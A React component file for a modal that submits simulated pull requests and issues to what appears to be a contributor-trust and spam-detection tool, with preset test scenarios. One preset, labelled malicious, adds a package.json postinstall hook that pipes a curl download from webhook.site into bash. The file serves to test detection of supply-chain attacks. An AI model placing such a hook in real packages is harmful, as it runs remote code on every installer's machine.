import { useState } from 'react';
import { X } from 'lucide-react';
import type { ProjectNode, SubmissionKind } from '../engine/types.ts';

interface SubmitPrModalProps {
  projects: ProjectNode[];
  defaultProjectId: string;
  onClose: () => void;
  onSubmit: (payload: {
    kind: SubmissionKind;
    projectId: string;
    authorHandle: string;
    accountAgeDays: number;
    publicMergedPrs: number;
    title: string;
    body: string;
    filesChanged: string[];
    diffText: string;
  }) => Promise<void>;
}

const PRESETS: {
  label: string;
  kind: SubmissionKind;
  authorHandle: string;
  accountAgeDays: number;
  publicMergedPrs: number;
  title: string;
  body: string;
  filesChanged: string;
  diffText: string;
}[] = [
  {
    label: 'Honest Hackathon Student (PR)',
    kind: 'pr',
    authorHandle: 'maya_hack_2026',
    accountAgeDays: 4,
    publicMergedPrs: 0,
    title: 'fix(parser): handle trailing comma in JSON5 config loader',
    body: 'Fixes #1499. Added guard and unit test for trailing commas.',
    filesChanged: 'src/config/json5.ts, src/config/json5.test.ts',
    diffText: `--- a/src/config/json5.ts
+++ b/src/config/json5.ts
@@ -12,2 +12,5 @@ export function stripTrailingCommas(input: string) {
+  return input.replace(/,\\s*([}\\]])/g, '$1');
--- a/src/config/json5.test.ts
+++ b/src/config/json5.test.ts
@@ -5,2 +5,5 @@
+  it('strips trailing commas before closing brace', () => {
+    expect(stripTrailingCommas('{"a":1,}')).toBe('{"a":1}');
+  });`,
  },
  {
    label: 'Campaign Spam Variant (PR)',
    kind: 'pr',
    authorHandle: 'ai_wave_acct_99',
    accountAgeDays: 1,
    publicMergedPrs: 0,
    title: 'feat(utils): add universal retryAsync helper with exponential backoff',
    body: 'This PR introduces a clean universal retryAsync utility function with configurable jitter and exponential backoff to improve resilience across network operations.',
    filesChanged: 'src/utils/retryAsync.ts',
    diffText: `--- /dev/null
+++ b/src/utils/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 3, delayMs = 120) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await fn(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, attempt)));
+    }
+  }
+}`,
  },
  {
    label: 'Fake Bug Wave (Issue)',
    kind: 'issue',
    authorHandle: 'issue_bot_99',
    accountAgeDays: 1,
    publicMergedPrs: 0,
    title: 'bug: memory overflow panic in async cache serialization layer',
    body: 'There is a critical memory overflow in the cache serialization layer when processing concurrent worker payloads. Please allocate bounded buffer pools immediately.',
    filesChanged: '',
    diffText: '(GitHub Issue — no code diff)',
  },
  {
    label: 'Malicious postinstall Hook (PR)',
    kind: 'pr',
    authorHandle: 'new_supply_actor',
    accountAgeDays: 2,
    publicMergedPrs: 0,
    title: 'chore(scripts): optimize local setup script',
    body: 'Adds postinstall cache warmup.',
    filesChanged: 'package.json',
    diffText: `--- a/package.json
+++ b/package.json
@@ -6,2 +6,3 @@
+    "postinstall": "curl -s https://webhook.site/collect | bash",`,
  },
];

export function SubmitPrModal({
  projects,
  defaultProjectId,
  onClose,
  onSubmit,
}: SubmitPrModalProps) {
  const [kind, setKind] = useState<SubmissionKind>('pr');
  const [projectId, setProjectId] = useState(defaultProjectId);
  const [authorHandle, setAuthorHandle] = useState(PRESETS[0].authorHandle);
  const [accountAgeDays, setAccountAgeDays] = useState(PRESETS[0].accountAgeDays);
  const [publicMergedPrs, setPublicMergedPrs] = useState(PRESETS[0].publicMergedPrs);
  const [title, setTitle] = useState(PRESETS[0].title);
  const [body, setBody] = useState(PRESETS[0].body);
  const [filesChanged, setFilesChanged] = useState(PRESETS[0].filesChanged);
  const [diffText, setDiffText] = useState(PRESETS[0].diffText);
  const [submitting, setSubmitting] = useState(false);

  const applyPreset = (preset: (typeof PRESETS)[number]) => {
    setKind(preset.kind);
    setAuthorHandle(preset.authorHandle);
    setAccountAgeDays(preset.accountAgeDays);
    setPublicMergedPrs(preset.publicMergedPrs);
    setTitle(preset.title);
    setBody(preset.body);
    setFilesChanged(preset.filesChanged);
    setDiffText(preset.diffText);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      await onSubmit({
        kind,
        projectId,
        authorHandle,
        accountAgeDays: Number(accountAgeDays),
        publicMergedPrs: Number(publicMergedPrs),
        title,
        body,
        filesChanged:
          kind === 'issue'
            ? []
            : filesChanged
                .split(',')
                .map((s) => s.trim())
                .filter(Boolean),
        diffText: kind === 'issue' ? '(GitHub Issue — no code diff)' : diffText,
      });
      onClose();
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-slate-900/40 flex items-center justify-center p-4">
      <div className="bg-white border border-slate-200 rounded-lg w-full max-w-2xl max-h-[90vh] overflow-y-auto p-6 space-y-5">
        <div className="flex items-center justify-between border-b border-slate-100 pb-3">
          <div>
            <h3 className="text-base font-semibold text-slate-900">
              Simulate Incoming Pull Request or Issue
            </h3>
            <p className="text-xs text-slate-500">
              Test live trust-graph lookup, voucher credibility, SimHash clustering, and deterministic static checks.
            </p>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 text-slate-400 hover:text-slate-700 rounded"
            aria-label="Close modal"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <span className="text-xs text-slate-500">Quick scenarios:</span>
          {PRESETS.map((p) => (
            <button
              key={p.label}
              type="button"
              onClick={() => applyPreset(p)}
              className="px-2.5 py-1 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded transition-colors"
            >
              {p.label}
            </button>
          ))}
        </div>

        <form onSubmit={handleSubmit} className="space-y-4 text-xs">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Submission Type</span>
              <select
                value={kind}
                onChange={(e) => setKind(e.target.value as SubmissionKind)}
                className="w-full px-3 py-2 bg-white border border-slate-200 rounded-md"
              >
                <option value="pr">Pull Request</option>
                <option value="issue">GitHub Issue</option>
              </select>
            </label>
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Target Project</span>
              <select
                value={projectId}
                onChange={(e) => setProjectId(e.target.value)}
                className="w-full px-3 py-2 bg-white border border-slate-200 rounded-md"
              >
                {projects
                  .filter((p) => !p.isSybilCluster)
                  .map((p) => (
                    <option key={p.id} value={p.id}>
                      {p.name} ({p.repo})
                    </option>
                  ))}
              </select>
            </label>
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Author Handle</span>
              <input
                required
                value={authorHandle}
                onChange={(e) => setAuthorHandle(e.target.value)}
                className="w-full px-3 py-2 font-mono bg-white border border-slate-200 rounded-md"
              />
            </label>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Account Age (days)</span>
              <input
                type="number"
                min={0}
                value={accountAgeDays}
                onChange={(e) => setAccountAgeDays(Number(e.target.value))}
                className="w-full px-3 py-2 font-mono bg-white border border-slate-200 rounded-md"
              />
            </label>
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Prior Merged PRs</span>
              <input
                type="number"
                min={0}
                value={publicMergedPrs}
                onChange={(e) => setPublicMergedPrs(Number(e.target.value))}
                className="w-full px-3 py-2 font-mono bg-white border border-slate-200 rounded-md"
              />
            </label>
            {kind === 'pr' && (
              <label className="space-y-1 block col-span-2 sm:col-span-1">
                <span className="font-medium text-slate-700">Files Changed</span>
                <input
                  value={filesChanged}
                  onChange={(e) => setFilesChanged(e.target.value)}
                  className="w-full px-3 py-2 font-mono bg-white border border-slate-200 rounded-md"
                />
              </label>
            )}
          </div>

          <label className="space-y-1 block">
            <span className="font-medium text-slate-700">Title</span>
            <input
              required
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              className="w-full px-3 py-2 bg-white border border-slate-200 rounded-md"
            />
          </label>

          <label className="space-y-1 block">
            <span className="font-medium text-slate-700">Description</span>
            <textarea
              rows={3}
              value={body}
              onChange={(e) => setBody(e.target.value)}
              className="w-full px-3 py-2 bg-white border border-slate-200 rounded-md"
            />
          </label>

          {kind === 'pr' && (
            <label className="space-y-1 block">
              <span className="font-medium text-slate-700">Unified Diff</span>
              <textarea
                required
                rows={6}
                value={diffText}
                onChange={(e) => setDiffText(e.target.value)}
                className="w-full px-3 py-2 font-mono bg-slate-900 text-slate-100 rounded-md border border-slate-800"
              />
            </label>
          )}

          <div className="flex justify-end gap-2 pt-2 border-t border-slate-100">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 text-xs font-medium text-slate-600 hover:text-slate-900"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={submitting}
              className="px-4 py-2 text-xs font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md disabled:opacity-50"
            >
              Evaluate Submission
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
